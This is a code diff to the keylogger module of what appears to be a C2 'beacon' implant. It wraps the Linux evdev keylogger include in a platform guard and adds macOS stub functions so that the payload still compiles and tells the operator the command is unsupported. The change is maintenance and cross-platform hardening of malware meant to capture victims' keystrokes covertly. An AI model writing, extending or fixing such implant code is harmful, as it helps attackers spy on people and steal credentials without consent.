@@ -17,7 +17,14 @@
     #include <dirent.h>
     #include <cstdio>
     #include <vector>
+    #if defined(__linux__)
+    // evdev exists on Linux and Android only. macOS has neither /dev/input
+    // nor this header, and including it unconditionally made the WHOLE
+    // beacon uncompilable there — "fatal error: 'linux/input.h' file not
+    // found", which is exactly what beacon-syntax(macos) and
+    // beacon-smoke-macos reported.
     #include <linux/input.h>
+    #endif
 #endif
 
 namespace keylogger {
@@ -306,9 +313,9 @@ inline std::string status() {
     return std::string(buf);
 }
 
-#else
+#elif defined(__linux__)
 
-// Linux evdev keylogger
+// Linux (and Android) evdev keylogger
 inline std::atomic<bool> is_running{false};
 inline std::thread ev_thread;
 inline char key_buffer[131072];
@@ -605,6 +612,41 @@ inline std::string status() {
 
 inline void poll() {
     // Periodic tasks: nothing needed for evdev (runs in its own thread)
+}
+
+#else   // macOS and any other POSIX without evdev
+
+// The API has to exist on every platform the beacon builds for: main.cpp
+// calls start/stop/status/dump/clear/poll unconditionally. The evdev
+// implementation cannot be compiled here (no /dev/input, no linux/input.h),
+// and "the payload does not build on macOS" is a much worse answer than
+// "this command is not supported on this platform" — which is what the
+// operator now gets, at runtime, from a header that compiles.
+inline std::atomic<bool> is_running{false};
+inline std::atomic<int> key_lock{0};
+
+inline void key_acquire() {}
+inline void key_release() {}
+inline void poll() {}
+
+inline std::string start() {
+    return "Keylogger: not supported on this platform (no evdev).";
+}
+
+inline std::string stop() {
+    return "Keylogger is not running.";
+}
+
+inline std::string dump(const std::string& = "") {
+    return "Keylogger: not supported on this platform (no evdev).";
+}
+
+inline std::string clear() {
+    return "Buffer cleared.";
+}
+
+inline std::string status() {
+    return "Keylogger: UNSUPPORTED (no evdev on this platform)";
 }
 
 #endif
